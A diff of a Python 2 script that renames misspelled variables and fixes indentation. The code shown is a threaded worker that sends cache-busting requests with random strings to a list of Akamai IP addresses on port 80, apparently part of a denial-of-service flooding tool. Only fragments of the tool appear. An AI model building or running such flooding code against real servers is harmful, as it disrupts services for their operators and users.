@@ -61,13 +61,13 @@ class WorkerThread(threading.Thread):
 		self.kill_received = False
 	
 	def stop(self):
-        	self.kill_recieved = True
+		self.kill_received = True
 
 	def run(self):
 		while not self.kill_received:
 			while True:
 				try:
-					akami_ip = self.qin.get(timeout=1)
+					akamai_ip = self.qin.get(timeout=1)
 
 				except Queue.Empty:
 
@@ -77,15 +77,15 @@ class WorkerThread(threading.Thread):
 					r = base_request.replace("%RANDOM%", gen_rand_string())
 					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 					s.settimeout(2)
-					s.connect( (akami_ip, 80) )
+					s.connect( (akamai_ip, 80) )
 					s.send(r)
 					ret = s.recv(16).strip()
-					print c_g + "[Thread '%d' ] Packet => '%s:80' => Response '%s'" % (self.tid, akami_ip, ret) + c_e
+					print c_g + "[Thread '%d' ] Packet => '%s:80' => Response '%s'" % (self.tid, akamai_ip, ret) + c_e
 					s.close()
 					self.qin.task_done()
 			
 				except:
-					print c_r + "[!] " + c_e + "Error contacting '%s:80'" % akami_ip
+					print c_r + "[!] " + c_e + "Error contacting '%s:80'" % akamai_ip
 					s.close()
 				
 	
@@ -104,7 +104,7 @@ if __name__ == "__main__":
 
 	banner()
 
-	akamai_list 	= sys.argv[sys.argv.index("-l")+1]
+	akamai_list = sys.argv[sys.argv.index("-l")+1]
 	request_f	= sys.argv[sys.argv.index("-r")+1]
 
 	try:
@@ -131,8 +131,8 @@ if __name__ == "__main__":
 		pass
 
 	try:
-		akami_file = open(akamai_list, "r")
-		for i in akami_file.readlines():
+		akamai_file = open(akamai_list, "r")
+		for i in akamai_file.readlines():
 			akamai_ips.append(i.strip())
 		
 	except:
